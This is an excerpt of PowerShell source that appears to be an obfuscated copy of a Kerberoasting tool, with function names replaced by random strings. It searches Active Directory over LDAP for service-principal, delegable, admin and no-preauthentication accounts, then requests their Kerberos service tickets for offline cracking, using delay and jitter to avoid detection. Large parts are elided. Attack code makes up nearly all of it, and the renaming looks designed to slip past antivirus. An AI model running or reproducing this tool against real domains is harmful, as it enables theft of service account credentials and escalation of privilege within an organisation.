function SPUH9CP0 {
    ...
    PROCESS {
        ...
        $SearchString += $DN
        Write-Verbose "[SPUH9CP0] search string: $SearchString"

        if ($Credential -ne [Management.Automation.PSCredential]::Empty) {
            Write-Verbose "[SPUH9CP0] Using alternate credentials for LDAP connection"
	...
	$RandNo = New-Object System.Random
        ...
        ForEach ($Object in $TargetObject) {
            ...
            try {
                ...
                Write-Warning "[UW76QCWM] Error requesting ticket for SPN '$UserSPN' from user '$DistinguishedName' : $_"
            }
            if ($Ticket) {
    ...
    PROCESS {
        ...
        if ($UserSearcher) {
            ...
            $Identity | Where-Object {$_} | ForEach-Object {
                ...
                elseif ($IdentityInstance -match '^CN=') {
                    ...
                    if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
                        ...
                        Write-Verbose "[4K4YH1IL] Extracted domain '$IdentityDomain' from '$IdentityInstance'"
                        $SearcherArguments['Domain'] = $IdentityDomain
                        $UserSearcher = SPUH9CP0 @SearcherArguments
                        if (-not $UserSearcher) {
                            Write-Warning "[4K4YH1IL] Unable to retrieve domain searcher for '$IdentityDomain'"
                        }
                    }
                }
                ...
                elseif ($IdentityInstance.Contains('\')) {
                    ...
                    if ($ConvertedIdentityInstance) {
                        ...
                        Write-Verbose "[4K4YH1IL] Extracted domain '$UserDomain' from '$IdentityInstance'"
                        $UserSearcher = SPUH9CP0 @SearcherArguments
                    }
                }
                else {
            ...
            if ($PSBoundParameters['SPN']) {
                Write-Verbose '[4K4YH1IL] Searching for non-null service principal names'
                $Filter += '(servicePrincipalName=*)'
            }
            if ($PSBoundParameters['AllowDelegation']) {
                Write-Verbose '[4K4YH1IL] Searching for users who can be delegated'
                
                $Filter += '(!(userAccountControl:1.2.840.113556.1.4.803:=1048574))'
            }
            if ($PSBoundParameters['DisallowDelegation']) {
                Write-Verbose '[4K4YH1IL] Searching for users who are sensitive and not trusted for delegation'
                $Filter += '(userAccountControl:1.2.840.113556.1.4.803:=1048574)'
            }
            if ($PSBoundParameters['AdminCount']) {
                Write-Verbose '[4K4YH1IL] Searching for adminCount=1'
                $Filter += '(admincount=1)'
            }
            if ($PSBoundParameters['TrustedToAuth']) {
                Write-Verbose '[4K4YH1IL] Searching for users that are trusted to authenticate for other principals'
                $Filter += '(msds-allowedtodelegateto=*)'
            }
            if ($PSBoundParameters['PreauthNotRequired']) {
                Write-Verbose '[4K4YH1IL] Searching for user accounts that do not require kerberos preauthenticate'
                $Filter += '(userAccountControl:1.2.840.113556.1.4.803:=4194304)'
            }
            if ($PSBoundParameters['LDAPFilter']) {
                Write-Verbose "[4K4YH1IL] Using additional LDAP filter: $LDAPFilter"
                $Filter += "$LDAPFilter"
            }
            ...
            Write-Verbose "[4K4YH1IL] filter string: $($UserSearcher.filter)"
            ...
            if ($Results) {
                try { $Results.dispose() }
                    ...
                    Write-Verbose "[4K4YH1IL] Error disposing of the Results object: $_"
                }
            }
...
function Invoke-Kerberoast {
    ...
    PROCESS {
        ...
        4K4YH1IL @UserSearcherArguments | Where-Object {$_.samaccountname -ne 'krbtgt'} | UW76QCWM -Delay $Delay -OutputFormat $OutputFormat -Jitter $Jitter
    }
